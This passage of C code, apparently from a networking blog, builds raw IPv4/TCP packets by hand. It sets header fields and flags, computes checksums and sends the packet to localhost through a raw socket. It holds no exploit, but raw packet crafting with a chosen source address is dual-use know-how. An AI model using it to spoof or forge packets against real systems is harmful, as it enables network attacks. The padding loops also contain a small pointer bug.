Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed to get socket descriptor for using ioctl() "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">    <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">"%s"</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ioctl() failed to find interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// dbg_printf("Index for interface %s is %i\n", interface, ifr.ifr_ifindex);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + TCP_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off = htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) +</span><br><span class="line">                         (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) + ip_flags[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = IPPROTO_TCP;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="keyword">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TCP header</span></span><br><span class="line">    <span class="comment">// Source port number (16 bits)</span></span><br><span class="line">    tcphdr.th_sport = htons(<span class="number">60</span>);</span><br><span class="line">    <span class="comment">// Destination port number (16 bits)</span></span><br><span class="line">    tcphdr.th_dport = htons(<span class="number">80</span>);</span><br><span class="line">    <span class="comment">// Sequence number (32 bits)</span></span><br><span class="line">    tcphdr.th_seq = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Acknowledgement number (32 bits)</span></span><br><span class="line">    tcphdr.th_ack = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Reserved (4 bits): should be 0</span></span><br><span class="line">    tcphdr.th_x2 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Data offset (4 bits): size of TCP header in 32-bit words</span></span><br><span class="line">    tcphdr.th_off = TCP_HDRLEN / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Flags (8 bits)</span></span><br><span class="line">    <span class="comment">// FIN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// SYN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// RST flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// PSH flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// ACK flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// URG flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// ECE flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// CWR flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    tcphdr.th_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        tcphdr.th_flags += (tcp_flags[i] &lt;&lt; i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Window size (16 bits)</span></span><br><span class="line">    tcphdr.th_win = htons(<span class="number">65535</span>);</span><br><span class="line">    <span class="comment">// Urgent pointer (16 bits): 0 (only valid if URG flag is set)</span></span><br><span class="line">    tcphdr.th_urp = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// TCP checksum (16 bits)</span></span><br><span class="line">    tcphdr.th_sum =</span><br><span class="line">        tcp4_checksum(iphdr, tcphdr, (<span class="keyword">uint8_t</span> *)payload, payloadlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Next part of packet is upper layer protocol header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), &amp;tcphdr, TCP_HDRLEN * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN + TCP_HDRLEN), payload,</span><br><span class="line">           payloadlen * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to set IP_HDRINCL "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to bind to interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (struct sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"sendto() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">    <span class="built_in">free</span>(payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Computing the internet checksum (RFC 1071).</span></span><br><span class="line"><span class="comment">// Note that the internet checksum does not preclude collisions.</span></span><br><span class="line"><span class="keyword">uint16_t</span> checksum(<span class="keyword">uint16_t</span> *addr, <span class="keyword">int</span> len) &#123;</span><br><span class="line">    <span class="keyword">int</span> count = len;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> answer = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sum up 2-byte values until none or only one byte left.</span></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        sum += *(addr++);</span><br><span class="line">        count -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add left-over byte, if any.</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += *(<span class="keyword">uint8_t</span> *)addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fold 32-bit sum into 16 bits; we lose information by doing this,</span></span><br><span class="line">    <span class="comment">// increasing the chances of a collision.</span></span><br><span class="line">    <span class="comment">// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)</span></span><br><span class="line">    <span class="keyword">while</span> (sum &gt;&gt; <span class="number">16</span>) &#123;</span><br><span class="line">        sum = (sum &amp; <span class="number">0xffff</span>) + (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Checksum is one's compliment of sum.</span></span><br><span class="line">    answer = ~sum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 ICMP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="keyword">uint16_t</span> icmp4_checksum(struct icmp icmphdr, <span class="keyword">uint8_t</span> *payload, <span class="keyword">int</span> payloadlen) &#123;</span><br><span class="line">    <span class="keyword">char</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">int</span> chksumlen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>]; <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Type to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_type, <span class="keyword">sizeof</span>(icmphdr.icmp_type));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Code to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_code, <span class="keyword">sizeof</span>(icmphdr.icmp_code));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy ICMP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don't know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Identifier to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_id, <span class="keyword">sizeof</span>(icmphdr.icmp_id));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Sequence Number to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_seq, <span class="keyword">sizeof</span>(icmphdr.icmp_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="keyword">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 TCP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="keyword">uint16_t</span> tcp4_checksum(struct ip iphdr, struct tcphdr tcphdr, <span class="keyword">uint8_t</span> *payload,</span><br><span class="line">                       <span class="keyword">int</span> payloadlen) &#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> svalue;</span><br><span class="line">    <span class="keyword">char</span> buf[IP_MAXPACKET], cvalue;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">int</span> i, chksumlen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy source IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_src.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy destination IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_dst.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy zero field to buf (8 bits)</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy transport layer protocol to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_p, <span class="keyword">sizeof</span>(iphdr.ip_p));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP length to buf (16 bits)</span></span><br><span class="line">    svalue = htons(<span class="keyword">sizeof</span>(tcphdr) + payloadlen);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;svalue, <span class="keyword">sizeof</span>(svalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP source port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_sport, <span class="keyword">sizeof</span>(tcphdr.th_sport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP destination port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_dport, <span class="keyword">sizeof</span>(tcphdr.th_dport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy sequence number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_seq, <span class="keyword">sizeof</span>(tcphdr.th_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy acknowledgement number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_ack, <span class="keyword">sizeof</span>(tcphdr.th_ack));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy data offset to buf (4 bits) and</span></span><br><span class="line">    <span class="comment">// copy reserved bits to buf (4 bits)</span></span><br><span class="line">    cvalue = (tcphdr.th_off &lt;&lt; <span class="number">4</span>) + tcphdr.th_x2;</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;cvalue, <span class="keyword">sizeof</span>(cvalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP flags to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_flags, <span class="keyword">sizeof</span>(tcphdr.th_flags));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP window size to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_win, <span class="keyword">sizeof</span>(tcphdr.th_win));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don't know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy urgent pointer to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_urp, <span class="keyword">sizeof</span>(tcphdr.th_urp));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="keyword">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of chars.</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">allocate_strmem</span><span class="params">(<span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"ERROR: Cannot allocate memory because len = %i in "</span></span><br><span class="line">                   <span class="string">"allocate_strmem().\n"</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">            <span class="string">"ERROR: Cannot allocate memory for array allocate_strmem().\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of unsigned chars.</span></span><br><span class="line"><span class="keyword">uint8_t</span> *allocate_ustrmem(<span class="keyword">int</span> len) &#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"ERROR: Cannot allocate memory because len = %i in "</span></span><br><span class="line">                   <span class="string">"allocate_ustrmem().\n"</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">            <span class="string">"ERROR: Cannot allocate memory for array allocate_ustrmem().\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of ints.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">allocate_intmem</span><span class="params">(<span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"ERROR: Cannot allocate memory because len = %i in "</span></span><br><span class="line">                   <span class="string">"allocate_intmem().\n"</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">            <span class="string">"ERROR: Cannot allocate memory for array allocate_intmem().\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *desc, <span class="keyword">void</span> *addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> 